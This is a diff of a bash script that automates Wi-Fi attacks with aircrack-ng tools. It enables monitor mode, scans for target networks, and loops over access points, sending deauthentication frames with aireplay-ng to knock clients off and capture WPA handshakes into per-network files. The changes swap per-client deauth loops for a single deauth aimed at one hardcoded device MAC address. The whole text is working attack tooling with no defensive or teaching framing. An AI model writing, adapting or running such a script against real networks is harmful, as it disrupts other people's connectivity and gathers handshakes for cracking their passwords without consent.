@@ -26,9 +26,9 @@ echo -e "${GREEN}Starting target cycle for: $TARGET_STRING${NC}"
 # 1. Prepare Interface
 sudo airmon-ng check kill
 sudo airmon-ng start $INTERFACE_PRE
-sudo systemctl start NetworkManager
-sudo nmcli device set wlan1mon managed no
-sudo airmon-ng start $INTERFACE_PRE
+# sudo systemctl start NetworkManager
+# sudo nmcli device set wlan1mon managed no
+# sudo airmon-ng start $INTERFACE_PRE
 # Main loop
 while true; do
     # 2. Initial Scan to find channels
@@ -56,29 +56,10 @@ while true; do
         SESSION_CAP="$OUTPUT_DIR/$ESSID"
 
         echo -e "Current Target: $ESSID with BSSID $BSSID on channel $CH"
-
-        sudo timeout 10s airodump-ng --channel "$CH" --bssid "$BSSID" -w "$OUTPUT_DIR/scans/targeted"  "$INTERFACE"  > /dev/null 2>&1 &
-        MONITOR_PID=$!
-        sleep 5s
-        sudo aireplay-ng -0 10 -a "$BSSID" -p 0841 "$INTERFACE"
-        TARGETED_CSV=$(ls -t "$OUTPUT_DIR/scans/"*targeted*[0-9].csv | head -n 1)
-        wait $MONITOR_PID
-        
-        # Start airodump-ng for 60 seconds
-        sudo timeout $MON_TIME airodump-ng --bssid "$BSSID"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null &
+        sudo timeout 30s airodump-ng --bssid "$BSSID" --channel "$CH"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null &
         MONITOR_PID=$!
         sleep 5s # Let it settle
-        STATION_LIST=$(sed -n '/Station/,$p' "$TARGETED_CSV" | grep "$BSSID" | cut -d',' -f1 | tr -d ' ')
-
-        echo "Found $(echo "$STATION_LIST" | wc -w) clients for $BSSID. Starting directed deauths..."
-
-        # 2. Loop through each client and send a directed "poke"
-        for client in $STATION_LIST; do
-            echo "  - Poking Client: $client"
-            # Send 5 directed packets specifically to this device
-            sudo aireplay-ng -0 5 -a "$BSSID" -c "$client" "$INTERFACE" > /dev/null 2>&1 &
-        done
-        sudo aireplay-ng -D -0 3 -a "$BSSID" "$INTERFACE"  > /dev/null 2>&1
+        sudo aireplay-ng -D -0 2 -a "$BSSID" -c "50:84:92:06:B2:FC" "$INTERFACE" #   > /dev/null 2>&1
         wait $MONITOR_PID
 
         # 3. THE VALIDATION CHECK
